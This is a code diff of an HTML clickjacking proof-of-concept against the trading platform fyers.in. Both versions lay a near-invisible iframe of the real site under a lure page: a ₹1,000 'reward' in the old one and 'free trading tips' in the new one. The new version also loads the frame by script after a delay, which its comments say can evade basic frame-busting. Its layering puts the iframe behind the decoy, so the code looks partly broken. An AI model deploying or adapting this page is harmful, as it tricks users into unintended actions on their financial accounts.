@@ -1,39 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>You won a reward!</title>
-  <style>
-    body { background: #0f172a; color: white; text-align: center; font-family: Arial; }
-    .container { position: relative; width: 100%; height: 800px; margin-top: 20px; }
-    iframe {
-      position: absolute; top: 0; left: 0;
-      width: 100%; height: 100%;
-      opacity: 0.004;   /* effectively invisible to victim */
-      z-index: 2;
-      border: none;
-      pointer-events: auto;
-    }
-    .decoy {
-      position: absolute; top: 300px;
-      width: 100%; z-index: 1;
-      text-align: center;
-    }
-    button {
-      padding: 16px 36px; font-size: 18px;
-      background: #22c55e; color: #000;
-      border: none; border-radius: 8px; cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Trading Tips - Click to Claim!</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            position: relative;
+            width: 800px;
+            height: 600px;
+            border: 1px solid #ccc;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        #decoy-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+            color: white;
+            text-align: center;
+        }
+        #decoy-layer h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        #decoy-layer p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+        }
+        #decoy-button {
+            padding: 15px 40px;
+            font-size: 1.5rem;
+            background-color: #ff9800;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+        }
+        #decoy-button:hover {
+            background-color: #f57c00;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0,0,0,0.3);
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.0001;  /* Almost invisible */
+            z-index: 1;      /* Behind the decoy */
+        }
+    </style>
 </head>
 <body>
-  <h2>🎉 Congratulations! You have been selected.</h2>
-  <p>Click below to claim your ₹1,000 reward.</p>
-  <div class="container">
-    <div class="decoy">
-      <button>Claim Reward</button>
+    <div class="container">
+        <!-- Decoy content, visible to the user -->
+        <div id="decoy-layer">
+            <h1>🎉 Exclusive Trading Tips Inside! 🎉</h1>
+            <p>Click the button below to unlock your premium trading signals for this week.</p>
+            <button id="decoy-button">👉 Claim My Free Tips 👈</button>
+        </div>
+
+        <!-- Hidden iframe containing the target FYERS page -->
+        <iframe id="clickjacking-frame" 
+                data-src="https://fyers.in/"
+                sandbox="allow-forms allow-scripts allow-popups allow-same-origin">
+        </iframe>
     </div>
-    <!-- fyers.in loads invisibly on top — user clicks land on FYERS UI -->
-    <iframe src="https://fyers.in/"></iframe>
-  </div>
+
+    <script>
+        // Function to load the iframe, bypassing simple frame busting
+        function loadIframe() {
+            var iframe = document.getElementById('clickjacking-frame');
+            // Set the src attribute via JavaScript to potentially bypass basic frame busters
+            iframe.src = iframe.getAttribute('data-src');
+        }
+
+        // Load the iframe when the page is fully loaded
+        window.addEventListener('load', function() {
+            // Short delay to simulate a normal page load
+            setTimeout(loadIframe, 1000);
+        });
+    </script>
 </body>
 </html>
